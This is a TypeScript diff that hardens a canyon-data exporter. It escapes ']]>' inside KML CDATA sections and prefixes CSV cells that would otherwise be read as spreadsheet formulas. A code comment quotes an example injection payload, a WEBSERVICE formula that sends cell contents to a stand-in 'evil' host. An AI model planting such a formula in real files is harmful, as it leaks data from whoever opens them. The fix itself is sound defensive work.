@@ -69,6 +69,16 @@ function escapeXml(s: string): string {
     .replace(/'/g, "&apos;");
 }
 
+// A `]]>` inside CDATA content ends the section early — the remainder is then
+// parsed as XML markup, so unescaped user text (notes, altNames, sources; a
+// canyon shared with the exporter carries the OWNER's text) can inject
+// arbitrary elements into the exported KML (FECO-009). Split the terminator
+// across two adjacent CDATA sections, which XML concatenates back into the
+// literal text: the standard escape for "]]>" inside CDATA.
+function escapeCdata(s: string): string {
+  return s.replace(/\]\]>/g, "]]]]><![CDATA[>");
+}
+
 function descriptionText(c: TCanyon): string {
   const parts: string[] = [];
   if (c.altNames.length > 0) parts.push(`Also known as: ${c.altNames.join(", ")}`);
@@ -142,7 +152,7 @@ function canyonsToKml(canyons: TCanyon[]): Blob {
       return [
         `  <Placemark>`,
         `    <name>${escapeXml(c.name)}</name>`,
-        desc ? `    <description><![CDATA[${desc}]]></description>` : "",
+        desc ? `    <description><![CDATA[${escapeCdata(desc)}]]></description>` : "",
         `    <Point><coordinates>${c.longitude},${c.latitude},0</coordinates></Point>`,
         `  </Placemark>`,
       ]
@@ -190,6 +200,34 @@ const CSV_COLUMNS = [
   ...EXPORT_PROPERTY_KEYS,
   "sources",
 ] as const;
+
+// Excel/LibreOffice/Sheets treat a cell starting with =, +, -, @ (or a tab/CR
+// that a formula scanner skips past) as a formula to evaluate on open — CSV
+// injection. A canyon name/notes/custom-field value like
+// `=WEBSERVICE("https://evil/?d="&A1)` survives Papa.unparse's quoting
+// unmodified and executes for whoever opens the file (FECO-010; the
+// cross-user path is real — a sharee can export the owner's notes). Prefix a
+// `'` so spreadsheet apps render it as inert text; Papa.unparse still quotes
+// the cell as needed around that prefix.
+//
+// Only applied to free-text columns (below), NOT to latitude/longitude/the
+// numeric grade columns: those are always `String(number)` — a negative
+// coordinate ("-33.5") is a valid numeric literal spreadsheet software parses
+// as a number rather than evaluating as a formula, and prefixing it would
+// corrupt the app's own CSV round-trip (parseLatLng on re-import).
+function neutralizeFormula(value: string): string {
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
+// Columns whose cells can carry arbitrary user-authored text (as opposed to
+// the app's own numeric formatting) — the formula-injection guard applies
+// only to these (FECO-010).
+const CSV_TEXT_COLUMNS = new Set<(typeof CSV_COLUMNS)[number]>([
+  "name",
+  "altNames",
+  "notes",
+  "sources",
+]);
 
 function csvCell(c: TCanyon, column: (typeof CSV_COLUMNS)[number]): string {
   switch (column) {
@@ -239,12 +277,17 @@ function canyonsToCsv(canyons: TCanyon[]): Blob {
   const rows = canyons.map((c) => {
     const customFields = canyonCustomFields(c);
     const row: Record<string, string> = {};
-    for (const column of CSV_COLUMNS) row[column] = csvCell(c, column);
+    for (const column of CSV_COLUMNS) {
+      const cell = csvCell(c, column);
+      row[column] = CSV_TEXT_COLUMNS.has(column) ? neutralizeFormula(cell) : cell;
+    }
     for (const key of attrKeys) {
       // Empty cell for canyons lacking the field; String() for present values
       // (custom-field values re-ingest as strings via the `attr:<key>` role).
+      // Custom-field values are free-form user text — formula-injection guard
+      // applies here too (FECO-010).
       const value = customFields[key];
-      row[`attr:${key}`] = value == null ? "" : String(value);
+      row[`attr:${key}`] = value == null ? "" : neutralizeFormula(String(value));
     }
     return row;
   });
